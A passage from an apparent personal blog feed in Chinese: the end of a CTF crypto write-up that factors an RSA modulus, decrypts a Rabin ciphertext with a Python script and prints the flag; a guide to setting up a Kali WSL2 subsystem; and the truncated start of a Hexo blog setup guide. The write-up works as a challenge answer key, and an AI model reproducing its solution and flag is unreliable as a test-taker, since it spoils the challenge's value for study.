class="hljs-string">&#x27;n2=&#x27;</span>,n2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;e2=&#x27;</span>,e2)<br><br><span class="hljs-comment">#c1= 47916081717706538925639104682570684180170502544820197539239827441426724468768104306254078605230687136184497929</span><br><span class="hljs-comment">#n1= 164133678169710886720989064489094710242148933867688762980230890673424334054283751851389412792855634009922402873730095480540590589967587744481839586009206921690415208556737311431588106941893527836076971942678255228990259381439694065742253470463684082142779114879828632048097049587164541575068678559785497341341</span><br><span class="hljs-comment">#c2= 63878844405215916614306503133484342687866237414982537489487243642156715327887644418701791728466044672606833177790745723348407141495434918350324367721472060206442057535810542180796122799773614557047720846326110736372382283280049448530028736552356917154044523343646598823659486063811304671208433254991406080968</span><br><span class="hljs-comment">#n2= 81943314005002234143294576769951701354140501422348161833411886396153974002840590020014331444356263770668675416273077939014396178809052011274358602695903955726427501943378842406211922876951617483948075311923120200295968581991729752554553727773176109055672586268192629406914315361730879469185143748796847985621</span><br><span class="hljs-comment">#e2= 3</span><br></code></pre></td></tr></table></figure><p>这里可以直接用yufa求出n1的p1和q1。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">p1 = 12811466667392570112903020723113200908135795522924343912673155238307646898630978112977114315459571857717363854146878156826948894915692623941799726230600543<br>q1 = 12811466667392570112903020723113200908135795522924343912673155238307646898630978112977114315459571857717363854146878156826948894915692623941799726230598787<br></code></pre></td></tr></table></figure><p>本以为要爆破e1求出一部分明文，可没发现这是Rabin加密，Rabin加密是RSA的衍生算法，e==2是Rabin加密典型特征,这里可以推理出e1=2。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    p1=getPrime(<span class="hljs-number">512</span>)<br>    q1=gmpy2.next_prime(p1)<br>    <span class="hljs-keyword">if</span> p1%<span class="hljs-number">4</span>==<span class="hljs-number">3</span> <span class="hljs-keyword">and</span> q1%<span class="hljs-number">4</span>==<span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>看一下Rabin加密过程。</p><img src="/2021/11/15/crypto1/image-20211115233501411.png" class="" title="image-20211115233501411"><p>一般先通过其他方法分解得到p，q，然后解密。</p><p>直接上脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> libnum<br>n = <span class="hljs-number">164133678169710886720989064489094710242148933867688762980230890673424334054283751851389412792855634009922402873730095480540590589967587744481839586009206921690415208556737311431588106941893527836076971942678255228990259381439694065742253470463684082142779114879828632048097049587164541575068678559785497341341</span><br>e = <span class="hljs-number">2</span><br>c = <span class="hljs-number">47916081717706538925639104682570684180170502544820197539239827441426724468768104306254078605230687136184497929</span><br>q=<span class="hljs-number">12811466667392570112903020723113200908135795522924343912673155238307646898630978112977114315459571857717363854146878156826948894915692623941799726230600543</span><br>p=<span class="hljs-number">12811466667392570112903020723113200908135795522924343912673155238307646898630978112977114315459571857717363854146878156826948894915692623941799726230598787</span><br><br>inv_p = invert(p, q)<br>inv_q = invert(q, p)<br>mp = <span class="hljs-built_in">pow</span>(c, (p + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, p)<br>mq = <span class="hljs-built_in">pow</span>(c, (q + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, q)<br>a = (inv_p * p * mq + inv_q * q * mp) % n<br>b = n - <span class="hljs-built_in">int</span>(a)<br>c = (inv_p * p * mq - inv_q * q * mp) % n<br>d = n - <span class="hljs-built_in">int</span>(c)<br><span class="hljs-comment">#因为rabin 加密有四种结果，全部列出。</span><br>aa=[a,b,c,d]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> aa:<br>    <span class="hljs-built_in">print</span>(i)<br>    <span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(i)))<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">164133678169710886720989064489094710242148933867688762980230890673424334054283751851389412792855634009922402873730095480540590589967587744481839586009206921690415208556737311431588106941893527836076971942678255228990259381439694065742253470463684082142772192735528077014238153360304748328089408080112449883168</span><br><span class="hljs-string">b&quot;\xe9\xbb\xef\nj\xb4\xf0\xe9\xf7W_\x18\x7f\xb2\r\xd3G\xac\tw\xa8\x85\xa5\xf7\x91\x1c\x8b\xd4k\xde\x85\xe2\xf2\xc4\x0b\xe7\xc5\xb9N\x98\xb6\t\x8c2_\xb1\xe5\xb0\xdd#\xa8o#\x18&#x27;\xbc\x03\xf5V\x12G\xec\xf4&gt;\x9b`^\xb3C\nl\x0et.\xa2\xbd\x02\xf8b\x9b\xe2\x91\xb6\xda\x85\xa8\xcc\xa68\xea\x92W2w\xd7\x8b\xd2TG\xe81\xac\x1d\x9fD\xa4MZ\xa4\xb1\xf4C\xe2\x94\x81\x86\xb7\x8eI\xea\xf1p-\x97\x99&gt;\x0c &quot;</span><br><span class="hljs-number">6922144300555033858896226859793246979270479673047458173</span><br><span class="hljs-string">b&#x27;HECTF&#123;Ra6in_1s_g0od!!!&#125;&#x27;</span><br><span class="hljs-number">151234790021977343231526370354985900439519917424783837415725273980410348804004049257145825682710942954573925678611719267208705091305263740825485945735814116354276508999823334615039797016241940670202777442443875548448946315518120283668504491803612714327792225148164646682934408234881905123107732661481149367263</span><br><span class="hljs-string">b&quot;\xd7]\x90\xbc\xea1\x82mr&#123;]\xbe\xcfv\xde\x16[g\xfe:\x102\xd5\xdc\xd2d\x12\x0b)\xa9,\x0e\xa2u\x13\xb7\x86\xa8\xb4\x02\x81&gt;\x86q\x96O/\xbf&#x27;M\x89\x07\x9aO8\x87m\xb6\xa9\x08\xdfh\xeb\x9fx\r\xbd\xef\x96 \xbb\xd7\x11\xe3\x0b1VD\x8e\xf71\xa1\xf0\xbbL\x91SU\x18\xad\xb0\xb8\xb2\xc5W\x88Y\x05\xdb\x96\xac\xe4\xf3\x99\xd7A\xe7\x8f`:t-?R\x8a\x01\x9ak4\x08&#x27;\x02\xbd\xfc;1\x03\xdf&quot;</span><br><span class="hljs-number">12898888147733543489462694134108809802629016442904925564505616693013985250279702594243587110144691055348477195118376213331885498662324003656353640273392805336138699556913976816548309925651587165874194500234379680541313065921573782073748978660071367814986889731663985365162641352282636451960945898304347974078</span><br><span class="hljs-string">b&#x27;\x12^^M\x80\x83n|\x84\xdc\x01Y\xb0;/\xbc\xecD\x0b=\x98R\xd0\x1a\xbe\xb8y\xc9B5Y\xd4PN\xf80?\x10\x9a\x964\xcb\x05\xc0\xc9b\xb5\xf1\xb5\xd6\x1fg\x88\xc8\xef4\x96&gt;\xad\th\x84\x08\x9f#R\xa0\xc3\xac\xe9\xb07bK\x97\x8b\xac\xb3\xd3\xa4\xb0\xef\xc6\x1f9\x17yQ &lt;\xe1\x9e\x7f\xb2\x80\x03yNlQ\x84\xc7*\x05m\xaa\xab\x0e\x98\xbd\xfbi\x04x`\xf3|T\x89B1\x9d\xde\xff\x7f.)\xbe&#x27;</span><br><br></code></pre></td></tr></table></figure><p>可解出flag为：HECTF{Ra6in_1s_g0od!!!}。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crypto</tag>
      
      <tag>RSA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>win10搭建kali子系统(WSL2)</title>
    <link href="/2021/11/06/wsl2/"/>
    <url>/2021/11/06/wsl2/</url>
    
    <content type="html"><![CDATA[<h2 id="win10搭建kali子系统-WSL2"><a href="#win10搭建kali子系统-WSL2" class="headerlink" title="win10搭建kali子系统(WSL2)"></a>win10搭建kali子系统(WSL2)</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>用了很久的vm虚拟机的kali,但每次都觉得启动的太慢了，又想到win10支持使用Linux的子系统模式。子系统上的流畅度比虚拟机高出了不知多少，所以就打算用子系统了。如果不了解wsl子系统的话，可以先去看<a href="https://docs.microsoft.com/zh-cn/windows/wsl/about">微软官方文档。</a></p><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>必须运行 Windows 10 版本 2004 及更高版本（内部版本 19041 及更高版本）或 Windows 11。</p><h3 id="1-安装WSL2及kali子系统"><a href="#1-安装WSL2及kali子系统" class="headerlink" title="1. 安装WSL2及kali子系统"></a>1. 安装WSL2及kali子系统</h3><h4 id="1-1-启用-Linux-子系统组件"><a href="#1-1-启用-Linux-子系统组件" class="headerlink" title="1.1  启用 Linux 子系统组件"></a>1.1  启用 Linux 子系统组件</h4><p>打开系统设置 -&gt; 应用 -&gt; 右侧的程序和功能 -&gt; 启动或关闭windows功能 -&gt; 勾选适用于 Linux 的 Windows 子系统和勾选虚拟机平台，然后重启电脑。</p><img src="/2021/11/06/wsl2/image-20211106213228430.png" class=""><h4 id="1-2-下载Linux内核更新包"><a href="#1-2-下载Linux内核更新包" class="headerlink" title="1.2 下载Linux内核更新包"></a>1.2 下载Linux内核更新包</h4><p>打开微软官网并下载<a href="https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi">适用于 x64 计算机的 WSL2 Linux 内核更新包</a>，再进行安装，若出现以下页面，则证明安装成功。</p><img src="/2021/11/06/wsl2/image-20211106213723957.png" class=""><h4 id="1-3下载Windows-终端"><a href="#1-3下载Windows-终端" class="headerlink" title="1.3下载Windows 终端"></a>1.3下载Windows 终端</h4><p>打开微软商店，搜索Windows Terminal，下载并安装。</p><img src="/2021/11/06/wsl2/image-20211106214041034.png" class=""><h4 id="1-4-将-WSL-2-设置为默认版本"><a href="#1-4-将-WSL-2-设置为默认版本" class="headerlink" title="1.4 将 WSL 2 设置为默认版本"></a>1.4 将 WSL 2 设置为默认版本</h4><p>在桌面上，右键-&gt;在windows终端中打开，并输入以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">wsl --set-default-version 2<br></code></pre></td></tr></table></figure><h4 id="1-5-安装kali子系统"><a href="#1-5-安装kali子系统" class="headerlink" title="1.5 安装kali子系统"></a>1.5 安装kali子系统</h4><p>打开微软商店，搜索kali,下载并打开。</p><img src="/2021/11/06/wsl2/image-20211106214652392.png" class=""><img src="/2021/11/06/wsl2/image-20211106214715576.png" class=""><p>打开子系统后，系统会进行初始化，输入新的用户名及密码，这样，新的子系统就已经安装好了。</p><img src="/2021/11/06/wsl2/image-20211106215142267.png" class=""><h3 id="2-kali子系统的一些配置"><a href="#2-kali子系统的一些配置" class="headerlink" title="2. kali子系统的一些配置"></a>2. kali子系统的一些配置</h3><h4 id="2-1-设置root密码并更新系统"><a href="#2-1-设置root密码并更新系统" class="headerlink" title="2.1 设置root密码并更新系统"></a>2.1 设置root密码并更新系统</h4><p>在桌面上，右键-&gt;在windows终端中打开，并输入wsl,启动kali。</p><img src="/2021/11/06/wsl2/image-20211106220611750.png" class=""><p>输入以下命令设置root密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">临时使用管理员权限</span><br>sudo -i<br><span class="hljs-meta">#</span><span class="bash">设置root密码</span><br>passwd<br></code></pre></td></tr></table></figure><img src="/2021/11/06/wsl2/image-20211106221202322.png" class=""><p>更新系统（官方源会有点慢）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">更新可用的软件包列表</span><br>apt update<br><span class="hljs-meta">#</span><span class="bash">更新已安装的软件包</span><br>apt upgrade<br></code></pre></td></tr></table></figure><img src="/2021/11/06/wsl2/image-20211106222059895.png" class=""><img src="/2021/11/06/wsl2/image-20211106222156377.png" class="" title="image-20211106222156377"><h4 id="2-2更换默认源"><a href="#2-2更换默认源" class="headerlink" title="2.2更换默认源"></a>2.2更换默认源</h4><p><strong>百度搜索中科大源</strong></p><p><a href="https://mirrors.ustc.edu.cn/help/kali.html?highlight=kali">https://mirrors.ustc.edu.cn/help/kali.html?highlight=kali</a></p><img src="/2021/11/06/wsl2/image-20211106225119829.png" class=""><p>备份原始源文件，并将中科大的源添加到source.list中,再更新一下系统。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">进入apt文件夹</span><br>cd /etc/apt<br><span class="hljs-meta">#</span><span class="bash">备份源文件</span><br>mv sources.list sources.list.bak<br><span class="hljs-meta">#</span><span class="bash">将输入的内容重定向到source.list中</span><br>cat &gt;sources.list<br><br>deb https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib<br>deb-src https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib<br></code></pre></td></tr></table></figure><img src="/2021/11/06/wsl2/image-20211107084314605.png" class=""><h4 id="2-3-安装kali元数据包"><a href="#2-3-安装kali元数据包" class="headerlink" title="2.3 安装kali元数据包"></a>2.3 安装kali元数据包</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install -y kali-linux-default<br></code></pre></td></tr></table></figure><img src="/2021/11/06/wsl2/image-20211107084519598.png" class=""><h4 id="2-4-安装-Win-KeX"><a href="#2-4-安装-Win-KeX" class="headerlink" title="2.4 安装 Win-KeX"></a>2.4 安装 Win-KeX</h4><p>这里就贴上<a href="https://www.kali.org/docs/wsl/win-kex-win/">Win-KeX Win 使用文档</a>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt update<br>sudo apt install -y kali-win-kex<br></code></pre></td></tr></table></figure><p>win-kex支持三种模式运行：</p><ul><li><p>窗口模式：</p><img src="/2021/11/06/wsl2/image-20211108104931420.png" class=""><p>要在具有声音支持的窗口模式下启动 Win-KeX，请运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kex --win -s<br></code></pre></td></tr></table></figure></li><li><p>增强会话模式：<img src="https://www.kali.org/docs/wsl/win-kex/win-kex-2.png"></p></li><li><p>要在具有声音支持和 arm 解决方法的增强会话模式下启动 Win-KeX，请运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kex --esm --ip -s<br></code></pre></td></tr></table></figure></li><li><p>无缝模式：<img src="https://www.kali.org/docs/wsl/win-kex/win-kex-sl.png"></p><p>要在具有声音支持的无缝模式下启动 Win-KeX，请运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">kex --sl -s<br></code></pre></td></tr></table></figure></li></ul><p>如果空间足够的话，建议安装 Kali with the lot： </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install -y kali-linux-large<br></code></pre></td></tr></table></figure><p><a href="https://www.kali.org/docs/wsl/win-kex/win-kex-thelot.png"><img src="/2021/11/06/wsl2/win-kex-thelot.png" class=""></a></p><ul><li>创建<a href="https://www.microsoft.com/en-us/p/windows-terminal/9n0dx20hk701">Windows 终端</a>快捷方式：</li></ul><p><a href="https://www.kali.org/docs/wsl/win-kex/win-kex-wt1.png"><img src="/2021/11/06/wsl2/win-kex-wt1.png" class=""></a></p><p>在以下选项中进行选择：</p><p><strong>带有声音的窗口模式下的基本 Win-KeX：</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>      <span class="hljs-attr">&quot;guid&quot;</span>: <span class="hljs-string">&quot;&#123;55ca431a-3a87-5fb3-83cd-11ececc031d2&#125;&quot;</span>,<br>      <span class="hljs-attr">&quot;hidden&quot;</span>: <span class="hljs-literal">false</span>,<br>      <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Win-KeX&quot;</span>,<br>      <span class="hljs-attr">&quot;commandline&quot;</span>: <span class="hljs-string">&quot;wsl -d kali-linux kex --wtstart -s&quot;</span>,<br>&#125;,<br></code></pre></td></tr></table></figure><p><strong>带有声音的窗口模式下的高级 Win-KeX - Kali 图标并在 Kali 主目录中启动：</strong></p><p>将 kali-menu.png 图标复制到您的 windows 图片目录，并将图标和启动目录添加到您的 WT 配置中：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>        <span class="hljs-attr">&quot;guid&quot;</span>: <span class="hljs-string">&quot;&#123;55ca431a-3a87-5fb3-83cd-11ececc031d2&#125;&quot;</span>,<br>        <span class="hljs-attr">&quot;hidden&quot;</span>: <span class="hljs-literal">false</span>,<br>        <span class="hljs-attr">&quot;icon&quot;</span>: <span class="hljs-string">&quot;file:///c:/users/&lt;windows user&gt;/pictures/icons/kali-menu.png&quot;</span>,<br>        <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Win-KeX&quot;</span>,<br>        <span class="hljs-attr">&quot;commandline&quot;</span>: <span class="hljs-string">&quot;wsl -d kali-linux kex --wtstart -s&quot;</span>,<br>        <span class="hljs-attr">&quot;startingDirectory&quot;</span> : <span class="hljs-string">&quot;//wsl$/kali-linux/home/&lt;kali user&gt;&quot;</span><br>&#125;,<br></code></pre></td></tr></table></figure><p><strong>带声音的无缝模式下的基本 Win-KeX：</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>      <span class="hljs-attr">&quot;guid&quot;</span>: <span class="hljs-string">&quot;&#123;55ca431a-3a87-5fb3-83cd-11ececc031d2&#125;&quot;</span>,<br>      <span class="hljs-attr">&quot;hidden&quot;</span>: <span class="hljs-literal">false</span>,<br>      <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Win-KeX&quot;</span>,<br>      <span class="hljs-attr">&quot;commandline&quot;</span>: <span class="hljs-string">&quot;wsl -d kali-linux kex --sl --wtstart -s&quot;</span>,<br>&#125;,<br></code></pre></td></tr></table></figure><p><strong>带有声音的无缝模式下的高级 Win-KeX - Kali 图标并在 Kali 主目录中启动：</strong></p><p>将 kali-menu.png 图标复制到您的 windows 图片目录，并将图标和启动目录添加到您的 WT 配置中：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>        <span class="hljs-attr">&quot;guid&quot;</span>: <span class="hljs-string">&quot;&#123;55ca431a-3a87-5fb3-83cd-11ececc031d2&#125;&quot;</span>,<br>        <span class="hljs-attr">&quot;hidden&quot;</span>: <span class="hljs-literal">false</span>,<br>        <span class="hljs-attr">&quot;icon&quot;</span>: <span class="hljs-string">&quot;file:///c:/users/&lt;windows user&gt;/pictures/icons/kali-menu.png&quot;</span>,<br>        <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Win-KeX&quot;</span>,<br>        <span class="hljs-attr">&quot;commandline&quot;</span>: <span class="hljs-string">&quot;wsl -d kali-linux kex --sl --wtstart -s&quot;</span>,<br>        <span class="hljs-attr">&quot;startingDirectory&quot;</span> : <span class="hljs-string">&quot;//wsl$/kali-linux/home/&lt;kali user&gt;&quot;</span><br>&#125;,<br></code></pre></td></tr></table></figure><p><strong>带声音的 ESM 模式下的基本 Win-KeX：</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>      <span class="hljs-attr">&quot;guid&quot;</span>: <span class="hljs-string">&quot;&#123;55ca431a-3a87-5fb3-83cd-11ecedc031d2&#125;&quot;</span>,<br>      <span class="hljs-attr">&quot;hidden&quot;</span>: <span class="hljs-literal">false</span>,<br>      <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Win-KeX&quot;</span>,<br>      <span class="hljs-attr">&quot;commandline&quot;</span>: <span class="hljs-string">&quot;wsl -d kali-linux kex --esm --wtstart -s&quot;</span>,<br>&#125;,<br></code></pre></td></tr></table></figure><p><strong>带有声音的 ESM 模式下的高级 Win-KeX - Kali 图标并在 Kali 主目录中启动：</strong></p><p>将 kali-menu.png 图标复制到您的 windows 图片目录，并将图标和启动目录添加到您的 WT 配置中：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>        <span class="hljs-attr">&quot;guid&quot;</span>: <span class="hljs-string">&quot;&#123;55ca431a-3a87-5fb3-83cd-11ecedd031d2&#125;&quot;</span>,<br>        <span class="hljs-attr">&quot;hidden&quot;</span>: <span class="hljs-literal">false</span>,<br>        <span class="hljs-attr">&quot;icon&quot;</span>: <span class="hljs-string">&quot;file:///c:/users/&lt;windows user&gt;/pictures/icons/kali-menu.png&quot;</span>,<br>        <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Win-KeX&quot;</span>,<br>        <span class="hljs-attr">&quot;commandline&quot;</span>: <span class="hljs-string">&quot;wsl -d kali-linux kex --esm --wtstart -s&quot;</span>,<br>        <span class="hljs-attr">&quot;startingDirectory&quot;</span> : <span class="hljs-string">&quot;//wsl$/kali-linux/home/&lt;kali user&gt;&quot;</span><br>&#125;,<br></code></pre></td></tr></table></figure><p><a href="https://www.kali.org/docs/wsl/win-kex/win-kex-wt1.png"><img src="/2021/11/06/wsl2/win-kex-wt1.png" class=""></a></p><p><a href="https://www.kali.org/docs/wsl/win-kex/win-kex-wt2.png"><img src="/2021/11/06/wsl2/win-kex-wt2.png" class=""></a></p><p><a href="https://www.kali.org/docs/wsl/win-kex/win-kex-full.png"><img src="/2021/11/06/wsl2/win-kex-full.png" class=""></a></p><h4 id="2-5-修改wsl2内存"><a href="#2-5-修改wsl2内存" class="headerlink" title="2.5 修改wsl2内存"></a>2.5 修改wsl2内存</h4><ol><li><p>按下Windows + R 键，输入 <code>%UserProfile%</code> 并运行进入用户文件夹</p></li><li><p>新建文件 <code>.wslconfig</code> ，然后记事本编辑</p></li><li><p>填入以下内容并保存, memory为系统内存上限，这里我限制最大4GB，可根据自身电脑配置设置</p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">[wsl2]<br>memory=4GB<br>processors=4<br>swap=2GB<br>localhostForwarding=true<br></code></pre></td></tr></table></figure><p>   4 . 然后启动cmd命令提示符，输入 <code>wsl --shutdown</code> 来关闭当前的子系统</p><p>好了，kali子系统的安装就到这里了。</p>]]></content>
    
    
    <categories>
      
      <category>虚拟化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wsl2</tag>
      
      <tag>虚拟化</tag>
      
      <tag>kali-linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>手把手教你利用云服务器如何搭建属于自己的个人博客</title>
    <link href="/2021/11/03/hexo-build/"/>
    <url>/2021/11/03/hexo-build/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>使用的本地主机是windows10+云主机ubuntu20.04-lts版,利用云服务器搭建自己的博客。</p><h3 id="一、工作原理"><a href="#一、工作原理" class="headerlink" title="一、工作原理"></a>一、工作原理</h3><h3 id="二、搭建步骤"><a href="#二、搭建步骤" class="headerlink" title="二、搭建步骤"></a>二、搭建步骤</h3><h4 id="1、在本地搭建hexo环境"><a href="#1、在本地搭建hexo环境" class="headerlink" title="1、在本地搭建hexo环境"></a>1、在本地搭建hexo环境</h4><h5 id="1-1-在本机上安装node-js"><a href="#1-1-在本机上安装node-js" class="headerlink" title="1.1 在本机上安装node.js"></a>1.1 在本机上安装node.js</h5><p>官方连接：<a href="https://nodejs.org/zh-cn/">https://nodejs.org/zh-cn/</a></p><p>下载长期维护版，并安装好，安装好后win+r输入cmd并进入windows命令指示符，输入node -v并回车，若显示版本号，则证明安装成功。</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">PS C:\Users\23719\Desktop&gt; node -v<br>v14.17.6<br></code></pre></td></tr></table></figure><p>node.js里面还自带了npm包管理工具，可在cmd中查看npm版本。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">PS C:\Users\23719\Desktop&gt; npm -v<br>6.14.15<br></code></pre></td></tr></table></figure><h5 id="1-2-在本机上安装git"><a href="#1-2-在本机上安装git" class="headerlink" title="1.2 在本机上安装git"></a>1.2 在本机上安装git</h5><p>官方链接：<a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a></p><p>下载windows版，并安装好，若右键菜单中出现Git Bash和Git GUI菜单表明安装成功，如下图所示。 </p><h5 id="1-3-在本机上安装hexo"><a href="#1-3-在本机上安装hexo" class="headerlink" title="1.3 在本机上安装hexo"></a>1.3 在本机上安装hexo</h5><p>在D盘新建MyHexoBlogs文件夹用来存放个人博客，进入该文件夹，右键打开Git Bash，使用 npm 安装 Hexo。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> npm install -g hexo-cli</span><br></code></pre></td></tr></table></figure><p>Hexo安装完成后，在D盘下新建HexoBlogs项目，并对其进行初始化。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hexo init HexoBlogs</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> HexoBlogs</span><br><span class="hljs-meta">$</span><span class="bash"> npm install</span><br></code></pre></td></tr></table></figure><p>此时，会在MyHexoBlogs文件夹内部生成相应的项目文件。如下图所示：</p><p>在MyHexoBlogs文件夹下启动hexo服务。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hexo s</span><br></code></pre></td></tr></table></figure><p>此时在本地打开浏览器，通过 <a href="http://localhost:4000/">http://localhost:4000/</a> 便可访问基于Hexo的个人博客主页了，如下图所示：</p><h4 id="2、在云服务器上搭建相关服务"><a href="#2、在云服务器上搭建相关服务" class="headerlink" title="2、在云服务器上搭建相关服务"></a>2、在云服务器上搭建相关服务</h4><h5 id="2-1-安装nginx"><a href="#2-1-安装nginx" class="headerlink" title="2.1 安装nginx"></a>2.1 安装nginx</h5><p>这里我们采用的是nginx作为web服务器，所以我们要先安装nginx服务，具体步骤如下：</p><p>(1)安装nginx所需要的依赖。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install openssl libssl-dev#解决依赖包openssl安装<br>sudo apt install libpcre3 libpcre3-dev#解决依赖包pcre安装<br>sudo apt install 